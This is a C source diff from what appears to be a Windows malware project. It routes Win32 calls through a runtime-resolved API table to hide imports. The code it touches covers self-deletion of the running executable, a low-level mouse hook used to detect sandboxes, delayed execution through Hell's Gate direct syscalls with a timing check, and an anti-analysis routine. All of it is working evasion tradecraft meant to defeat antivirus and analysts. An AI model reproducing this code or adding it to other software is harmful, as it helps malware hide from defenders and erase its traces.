@@ -18,14 +18,14 @@ BOOL SelfDelete() {
 	}
 
 	// Get the path of the current executable
-	if (!GetModuleFileNameW(NULL, pFilePathBuffer, dwFilePathBufferSize)) {
+	if (!g_Api.pGetModuleFileNameW(NULL, pFilePathBuffer, dwFilePathBufferSize)) {
 		printf("[!] GetModuleFileNameW Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 	//wprintf(L"[+] FilePath: %ls\n", pFilePathBuffer);
 
 	// Opening a handle to the current file
-	HANDLE hFile = CreateFileW(
+	HANDLE hFile = g_Api.pCreateFileW(
 		pFilePathBuffer,
 		DELETE | SYNCHRONIZE,
 		FILE_SHARE_READ,
@@ -57,10 +57,10 @@ BOOL SelfDelete() {
 
 	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
 	pFileRenameInfo->FileNameLength = (DWORD)NewStreamSize;
-	CopyMemory(pFileRenameInfo->FileName, NewStream, pFileRenameInfo->FileNameLength);
+	CopyMemoryEx(pFileRenameInfo->FileName, NewStream, pFileRenameInfo->FileNameLength);
 
 	// Renaming the data stream
-	if (!SetFileInformationByHandle(
+	if (!g_Api.pSetFileInformationByHandle(
 		hFile,
 		FileRenameInfo,
 		pFileRenameInfo,
@@ -78,7 +78,7 @@ BOOL SelfDelete() {
 	}
 
 	// Re-opening a handle to the current file for refreshing
-	hFile = CreateFileW(
+	hFile = g_Api.pCreateFileW(
 		pFilePathBuffer,
 		DELETE | SYNCHRONIZE,
 		FILE_SHARE_READ,
@@ -87,12 +87,14 @@ BOOL SelfDelete() {
 		0,
 		NULL
 	);
-	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
-		return TRUE;
-	}
 	if (hFile == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
-		return FALSE;
+		if (GetLastError() == ERROR_FILE_NOT_FOUND) {
+			return TRUE;
+		}
+		else {
+			printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
+			return FALSE;
+		}
 	}
 
 	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
@@ -101,7 +103,7 @@ BOOL SelfDelete() {
 	};
 
 	// Marking for deletion after the file's handle is closed
-	if (!SetFileInformationByHandle(
+	if (!g_Api.pSetFileInformationByHandle(
 		hFile,
 		FileDispositionInfo,
 		&fileDispositionInfo,
@@ -130,13 +132,13 @@ LRESULT MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 		g_dwMouseClicks++;
 	}
 
-	return CallNextHookEx(NULL, nCode, wParam, lParam);
+	return g_Api.pCallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 BOOL InstallMouseHook() {
 	MSG         Msg = { 0 };
 
-	g_hMouseHook = SetWindowsHookExW(
+	g_hMouseHook = g_Api.pSetWindowsHookExW(
 		WH_MOUSE_LL,
 		(HOOKPROC)MouseHookCallback,
 		NULL,
@@ -148,8 +150,8 @@ BOOL InstallMouseHook() {
 	}
 
 	// Process unhandled events
-	while (GetMessageW(&Msg, NULL, 0, 0)) {
-		DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
+	while (g_Api.pGetMessageW(&Msg, NULL, 0, 0)) {
+		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
 	}
 
 	return TRUE;
@@ -165,7 +167,7 @@ BOOL DelayExec(DWORD dwMilliSeconds) {
 
 	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));
 
-	DWORD T0 = GetTickCount64();
+	DWORD T0 = g_Api.pGetTickCount64();
 
 	HellsGate(g_SyscallsTable.NtDelayExecution.wSystemCall);
 	status = HellDescent(
@@ -177,7 +179,7 @@ BOOL DelayExec(DWORD dwMilliSeconds) {
 		return FALSE;
 	}
 
-	DWORD T1 = GetTickCount64();
+	DWORD T1 = g_Api.pGetTickCount64();
 
 	if ((DWORD)(T1 - T0) < dwMilliSeconds)
 		return FALSE;
@@ -245,7 +247,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 		}
 
 		// Unhooking
-		if (g_hMouseHook && UnhookWindowsHookEx(g_hMouseHook) == FALSE) {
+		if (g_hMouseHook && g_Api.pUnhookWindowsHookEx(g_hMouseHook) == FALSE) {
 			printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
 			return FALSE;
 		}
